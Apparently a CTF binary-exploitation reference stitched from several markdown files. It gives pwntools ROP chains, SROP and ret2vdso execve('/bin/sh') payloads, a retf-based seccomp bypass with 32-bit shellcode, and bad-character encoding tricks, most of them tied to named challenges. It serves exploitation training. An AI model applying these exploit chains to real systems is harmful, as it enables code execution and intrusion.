- [Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
- [SROP with UTF-8 Payload Constraints (DiceCTF 2026)](#srop-with-utf-8-payload-constraints-dicectf-2026)
- [Seccomp Bypass](#seccomp-bypass)
- [RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
- [.fini_array Hijack](#fini_array-hijack)
- [pwntools Template](#pwntools-template)
  - [Automated Offset Finding via Corefile (Crypto-Cat)](#automated-offset-finding-via-corefile-crypto-cat)
- [ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)](#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go)
  - [Step 1 — Stack leak](#step-1--stack-leak)
  - [Step 2 — Write `/bin/sh` to known address](#step-2--write-binsh-to-known-address)
  - [Step 3 — Find vDSO base via AT_SYSINFO_EHDR](#step-3--find-vdso-base-via-at_sysinfo_ehdr)
  - [Step 4 — Dump vDSO and find gadgets](#step-4--dump-vdso-and-find-gadgets)
  - [Step 5 — execve ROP chain](#step-5--execve-rop-chain)
- [Useful Commands](#useful-commands)

For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).

---

## Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)

**Pattern (Eyeless):** Small stack overflow (22 bytes past buffer) — enough to overwrite RBP + RIP but too small for a ROP chain. No libc leak available. Use two `leave; ret` pivots to relocate execution to BSS, then chain `fgets` calls to write arbitrary-length ROP.

**Stage 1 — Pivot to BSS:**
```python
BSS_STAGE = 0x404500  # writable BSS address
LEAVE_RET = 0x4013d9  # leave; ret gadget

# Overflow: 128-byte buffer + RBP + RIP
payload = b'A' * 128
payload += p64(BSS_STAGE)   # overwrite RBP → BSS
payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
```

**Stage 2 — Chain fgets for large ROP:**
```python
# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3
SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*

stage2 = flat(
    SET_RDX_STDIN,
    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
    POP_RSI_R15, 0x700, 0,       # size
    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
    BSS_STAGE + 0x100,            # return into the new ROP chain
)
```

**Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.

**When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).

---

## SROP with UTF-8 Payload Constraints (DiceCTF 2026)

**Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**

**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.

**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:

```python
from pwn import *

# r15 is the field immediately before rdi in the sigframe
# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq

# ROP preamble: 3 UTF-8-safe gadgets
payload = b'\x00' * 0x48           # padding to return address
payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # trigger sigreturn
payload += bytes(frame)
# Place "/bin/sh\0" at offset 0x178 in BUFFER
```

**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.

**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`:
- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`

**Check rules:** `seccomp-tools dump ./binary`

See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.

## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)

**Pattern (Eyeless):** Seccomp blocks `execve`, `execveat`, `open`, `openat` in 64-bit mode. Switch to 32-bit (IA-32e compatibility mode) where syscall numbers differ and the filter does not apply.

**How it works:** The `retf` (far return) instruction pops RIP then CS from the stack. Setting `CS = 0x23` switches the CPU to 32-bit compatibility mode. In 32-bit mode, `int 0x80` uses different syscall numbers: `open=5`, `read=3`, `write=4`, `exit=1`.

**ROP chain to switch modes:**
```python
POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
POP_RDI     = 0x4013a5
POP_RSI_R15 = 0x4013a3
RETF        = libc_base + 0x294bf   # retf gadget in libc

# Step 1: mprotect BSS as RWX for shellcode
rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
rop += flat(libc_base + libc.sym.mprotect)

# Step 2: Far return to 32-bit shellcode on BSS
rop += flat(RETF)
rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
```

**32-bit shellcode (open/read/write flag):**
```nasm
mov esp, 0x404100       ; set up 32-bit stack
push 0x67616c66         ; "flag" (reversed)
push 0x2f2f2f2f         ; "////"
mov ebx, esp            ; ebx = filename pointer

mov eax, 5              ; SYS_open (32-bit)
xor ecx, ecx            ; O_RDONLY
int 0x80                ; open("////flag", O_RDONLY)

mov ebx, eax            ; fd from open
mov ecx, esp            ; buffer
mov edx, 0x100          ; size
mov eax, 3              ; SYS_read (32-bit)
int 0x80

mov edx, eax            ; bytes read
mov ecx, esp            ; buffer
mov ebx, 1              ; stdout
mov eax, 4              ; SYS_write (32-bit)
int 0x80

mov eax, 1              ; SYS_exit
int 0x80
```

**Key insight:** Seccomp filters configured for `AUDIT_ARCH_X86_64` do not check 32-bit `int 0x80` syscalls. The `retf` gadget (found in libc) switches architecture by loading CS=0x23. Requires making a memory region executable first via `mprotect`, since 32-bit shellcode must run from writable+executable memory.

**Finding retf in libc:**
```bash
ROPgadget --binary libc.so.6 | grep retf
# Or search for byte 0xcb:
objdump -d libc.so.6 | grep -w retf
```

**When to use:** Seccomp blocks critical 64-bit syscalls (`open`, `openat`, `execve`) but does not use `SECCOMP_FILTER_FLAG_SPEC_ALLOW` or check `AUDIT_ARCH`. Combine with `mprotect` to make BSS/heap executable for the 32-bit shellcode.

---

## Stack Shellcode with Input Reversal

**Pattern (Scarecode):** Binary reverses input buffer before returning.

**Strategy:**
1. Leak address via info-leak command (bypass PIE)
2. Find `sub rsp, 0x10; jmp *%rsp` gadget
3. Pre-reverse shellcode and RIP overwrite bytes
4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode

**Null-byte avoidance with `scanf("%s")`:**
- Can't embed `\x00` in payload
- Use partial pointer overwrite (6 bytes) -- top 2 bytes match since same mapping
- Use short jumps and NOP sleds instead of multi-address ROP chains

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO.

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.

## pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

def conn():
    if args.GDB:
        return gdb.debug([exe], gdbscript='init-pwndbg\ncontinue')
    elif args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# exploit here
io.interactive()
```

### Automated Offset Finding via Corefile (Crypto-Cat)

Automatically determine buffer overflow offset without manual `cyclic -l`:
```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    # x64: read saved RIP from stack pointer
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    # x86: use pc directly
    # offset = cyclic_find(p.corefile.pc)
    log.warn(f'Offset: {offset}')
    return offset
```

**Key insight:** pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.

## ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)

**Pattern:** Statically-linked binary with minimal functions and zero useful ROP gadgets (no `pop rdi`, `pop rsi`, `pop rax`, etc.). The Linux kernel maps a vDSO (Virtual Dynamic Shared Object) into every process, and it contains enough gadgets for `execve`.

### Step 1 — Stack leak

Overflow a buffer and read back more bytes than sent to leak stack pointers:
```python
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
```

### Step 2 — Write `/bin/sh` to known address

Use the binary's own `read` function via ROP to place `/bin/sh\0` at a page-aligned stack address:
```python
payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
p.sendline(payload)
p.send(b'/bin/sh\x00')
```

### Step 3 — Find vDSO base via AT_SYSINFO_EHDR

Dump the stack using the binary's `write` function. Search for `AT_SYSINFO_EHDR` (auxv type `0x21`) which holds the vDSO base address:
```python
# Dump 0x21000 bytes from stackbase
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:  # AT_SYSINFO_EHDR
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break
```

### Step 4 — Dump vDSO and find gadgets

Dump 0x2000 bytes from `vdso_base` using the binary's `write` function, then search for gadgets. Common vDSO gadgets:
```python
POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
```

### Step 5 — execve ROP chain

```python
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
payload += p64(0x0)              # r12 → rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_SYSCALL)
```

**Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.

**Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.

---

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```



---

<!-- Source: rop-and-shellcode.md -->

# CTF Pwn - ROP Chains and Shellcode

## Table of Contents
- [ROP Chain Building](#rop-chain-building)
  - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak--shell)
  - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
  - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
  - [Shell Interaction After execve](#shell-interaction-after-execve)
- [ret2csu — __libc_csu_init Gadgets (Crypto-Cat)](#ret2csu--__libc_csu_init-gadgets-crypto-cat)
- [Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)](#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat)
- [Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)](#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat)
  - [64-bit: BEXTR + XLAT + STOSB](#64-bit-bextr--xlat--stosb)
  - [32-bit: PEXT (Parallel Bits Extract)](#32-bit-pext-parallel-bits-extract)
- [Stack Pivot via xchg rax,esp (Crypto-Cat)](#stack-pivot-via-xchg-raxesp-crypto-cat)
- [sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)

For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).

---

## ROP Chain Building

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

### Two-Stage ret2libc (Leak + Shell)

When exploiting in two stages, choose the return target for stage 2 carefully:

```python
# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main

# IMPORTANT: Return target after leak
# - Returning to main may crash if check_status/setup corrupts stack
# - Returning to vuln directly may have stack issues
# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
#   This sets up a clean stack frame via the CALL instruction
```

**Leak parsing with no-newline printf:**
```python
# If printf("Laundry complete") has no trailing newline,
# puts() leak appears right after it on the same line:
# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```

### Raw Syscall ROP (When system() Fails)

If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:

```python
# Find gadgets in libc
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx junk
payload += p64(libc_base + syscall_ret)
```

**When to use raw syscall vs libc functions:**
- `system()` through libc: simplest, but may crash due to stack alignment or CET
- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead

### rdx Control in ROP Chains

After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.

**Solutions:**
1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.

### Shell Interaction After execve

After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.

```python
p.send(payload)  # Trigger execve

# Wait for shell to initialize before sending commands
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# For flag retrieval:
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# DON'T pipe commands via stdin when using pwntools - they get consumed
# by earlier read() calls. Use explicit sendline() after delays instead.
```

## ret2csu — __libc_csu_init Gadgets (Crypto-Cat)

**When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.

**Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
```asm
pop rbx        ; 0
pop rbp        ; 1
pop r12        ; function pointer (address of GOT entry)
pop r13        ; edi value
pop r14        ; rsi value
pop r15        ; rdx value
ret
```

**Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
```asm
mov rdx, r15   ; rdx = r15
mov rsi, r14   ; rsi = r14
mov edi, r13d  ; edi = r13 (32-bit!)
call [r12 + rbx*8]  ; call function pointer
add rbx, 1
cmp rbp, rbx
jne .loop      ; loop if rbx != rbp
; falls through to gadget 1 pop chain
```

**Exploit pattern:**
```python
csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL

payload = flat(
    b'A' * offset,
    csu_pop,
    0,            # rbx = 0 (index)
    1,            # rbp = 1 (loop count, must equal rbx+1)
    elf.got['puts'],  # r12 = function to call (GOT entry)
    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
    0xcafebabe,   # r14 → rsi (second arg)
    0x12345678,   # r15 → rdx (third arg)
    csu_call,     # trigger mov + call
    b'\x00' * 56, # padding for the 7 pops after call returns
    next_gadget,  # return address after csu completes
)
```

**Limitations:** `edi` is set via `mov edi, r13d` — only the lower 32 bits are written. For 64-bit first arguments, use a `pop rdi; ret` gadget instead. The function is called via `call [r12 + rbx*8]` — an indirect call through a pointer, so `r12` must point to a GOT entry or other memory containing the target address.

**Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.

---

## Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)

**When to use:** ROP payload must write data (e.g., `"/bin/sh"` or `"flag.txt"`) to memory, but certain bytes are forbidden (null bytes, newlines, spaces, etc.).

**Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.

**Required gadgets:**
```asm
pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
xor [r15], r14; ret            ; XOR memory at r15 with r14
mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
```

**Exploit pattern:**
```python
data_section = elf.symbols['__data_start']  # or .data address
xor_key = 2  # simple key that removes bad chars

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

target = b"flag.txt"
encoded = xor_bytes(target, xor_key)

payload = b'A' * offset

# Write XOR'd data in 8-byte chunks
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15,
        chunk,                    # XOR'd data
        data_section + i,         # destination address
        mov_r15_r14,              # write to memory
    )

# XOR each chunk back to recover original
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15,
        p64(xor_key),             # XOR key
        data_section + i,         # target address
        xor_r15_r14,              # decode in place
    )

# Now data_section contains "flag.txt" — use it as argument
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

**Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.

---

## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)

**When to use:** Standard `mov [reg], reg` write gadgets don't exist in the binary. Look for obscure x86 instructions that can be chained for byte-by-byte memory writes.

### 64-bit: BEXTR + XLAT + STOSB

**BEXTR** (Bit Field Extract) extracts bits from a source register. **XLAT** translates a byte via table lookup (`al = [rbx + al]`). **STOSB** stores `al` to `[rdi]` and increments `rdi`.

```python
# Gadgets from questionableGadgets section of binary
xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
                                                     # bextr rbx, rcx, rdx; ret
stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret

data_section = elf.symbols.__data_start

# Write "flag.txt" byte by byte
for i, char in enumerate(b"flag.txt"):
    # Find address of char in binary's read-only data
    char_addr = next(elf.search(bytes([char])))

    # BEXTR extracts rbx from rcx using rdx as control
    # rcx = char_addr - 0x3ef2 (compensate for add)
    # rdx = 0x4000 (extract 64 bits starting at bit 0)
    payload += flat(
        bextr_ret,
        0x4000,                    # rdx (BEXTR control: start=0, len=64)
        char_addr - 0x3ef2,        # rcx (offset compensated)
        xlat_ret,                  # al = byte at [rbx + al]
        pop_rdi,
        data_section + i,
        stosb_ret,                 # [rdi] = al; rdi++
    )
```

### 32-bit: PEXT (Parallel Bits Extract)

**PEXT** selects bits from a source using a mask and packs them contiguously. Combined with BSWAP and XCHG for byte-level writes.

```python
# Gadgets
pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
                                                      # pext edx,ebx,eax; ...ret
bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret

# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
def find_mask(target_byte, source=0xb0bababa):
    """Find 32-bit mask that extracts target_byte from source via PEXT."""
    source_bits = [(source >> i) & 1 for i in range(32)]
    target_bits = [(target_byte >> i) & 1 for i in range(8)]
    # Select 8 bits from source that match target bits
    mask = 0
    matched = 0
    for i in range(32):
        if matched < 8 and source_bits[i] == target_bits[matched]:
            mask |= (1 << i)
            matched += 1
    return mask if matched == 8 else None
```

**Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.

---

## Stack Pivot via xchg rax,esp (Crypto-Cat)

**When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.

**Two-stage pattern:**
```python
# Stage 1: Program provides a heap address where it wrote user data
pivot_addr = int(io.recvline(), 16)

# Prepare ROP chain at the pivot address (via earlier input)
stage2_rop = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],             # leak libc
    elf.symbols['main'],         # return to main for stage 3
)
io.send(stage2_rop)             # Written to pivot_addr by program

# Stage 2: Overflow with stack pivot
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
pop_rax = elf.symbols.usefulGadgets            # pop rax; ret

payload = flat(
    b'A' * offset,
    pop_rax,
    pivot_addr,         # load pivot address into rax
    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
)
```

**Why xchg vs. leave;ret:**
- `leave; ret` sets `rsp = rbp` — requires controlling `rbp` (often possible via overflow)
- `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
- `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)

**Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.

---

## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)

**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.

```python
from pwn import *

# Step 1: Scan executable for addresses containing each needed byte
exe_data = open('binary', 'rb').read()
byte_addrs = {}  # Maps byte value -> address in executable
for c in range(256):
    for i in range(len(exe_data)):
        addr = exe_base + i
        if exe_data[i] == c and not has_bad_chars(p32(addr)):
            byte_addrs[c] = addr
            break

# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
rop = b''
for i, byte in enumerate(shellcode):
    rop += p32(sprintf_plt)
    rop += p32(pop3ret)           # Clean 3 args
    rop += p32(bss_addr + i)     # Destination
    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
    rop += p32(0)                # Unused arg

# Step 3: Jump to assembled shellcode on BSS
rop += p32(bss_addr)
```

**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.



---

<!-- Source: rust-pwn.md -->

# Rust Binary Exploitation

Mechanics unique to `rustc`-compiled binaries. Triage on file fingerprint + presence of `.cargo`, `Cargo.toml`, or strings like `panicked at 'index out of bounds'`, `thread 'main' panicked`, or rustc symbols (`core::panicking::panic_bounds_check`, `_ZN4core3fmt3num50_`).

## Panic-Handler Stack Unwind Corruption (source: 2025 pwn.college / DiceCTF)

**Trigger:** binary catches panics (`std::panic::catch_unwind` or custom `#[panic_handler]`), then continues execution; heap or stack layout differs across the unwind.
**Signals:** panic messages thrown from a library the challenge loads (not from user code); panic is *recovered* and program continues; `personality` section present in readelf.
**Mechanic:** Rust unwinding traverses the stack via DWARF EH tables. If the unwinder's `Landing Pad` table is corruptible (e.g. via an OOB write the challenge exposes), re-aim it at attacker code. Even without EH table corruption, an `UnwindSafe` bound violation lets `Drop` impls run on objects whose invariants are broken — a corrupted `Vec` with `len > cap` causes arbitrary-length free during unwind. Primitive: write attacker bytes into `Vec::raw_parts`, force a panic in a sibling thread, observe `Drop::drop(self: &mut Vec)` calling `__rust_dealloc(ptr, wrong_size, align)` → heap corruption.

## `unsafe { transmute }` Lifetime Laundering

**Trigger:** code uses `mem::transmute` / `from_raw_parts` / `std::slice::from_raw_parts_mut` on user-derived pointers or lengths.
**Signals:** grep `transmute|from_raw_parts|slice::from_raw` — every hit is a bug candidate.
**Mechanic:** transmute doesn't change memory; it changes the compiler's type assumption. If attacker controls the length passed to `slice::from_raw_parts_mut(ptr, len)`, the resulting `&mut [u8]` has fake length → OOB R/W on any subsequent indexed access. Also: transmute between `&T` and `&mut T` via `*const T → *mut T` bypasses the borrow checker → double-mut-borrow undefined behaviour, which Rust expects to be impossible, so safe code downstream mis-optimises (e.g. LLVM hoists a load across a write because it thought the write couldn't happen).

## `Vec::set_len` / `Box::leak` Invariant Break

**Trigger:** unsafe path calls `v.set_len(n)` after `v.reserve(n)` but without writing all `n` elements; challenge then reads `v[i]`.
**Signals:** `reserve(…)` + `set_len(…)` pair without intervening `push`/`write`/`unsafe { write_unchecked }` loop of exactly `n` iterations.
**Mechanic:** `set_len` is `unsafe` precisely because it asserts initialised memory. If uninitialised, a `Vec<MyStruct>` read materialises garbage; worse, if `MyStruct` has a `Drop` impl, drop runs on garbage → arbitrary `vtable` jump (since dropping dispatches through `<dyn Trait>::drop`). Find a "garbage struct" whose fake vtable points at libc gadgets and win.

## Integer Conversion — `as` Truncation in Release Mode

**Trigger:** user-supplied `u64` cast via `as u32`/`as usize`; debug build panics on overflow, release build truncates silently.
**Signals:** `cargo run --release` behaves differently from `cargo run`; `as usize` on a subtraction result.
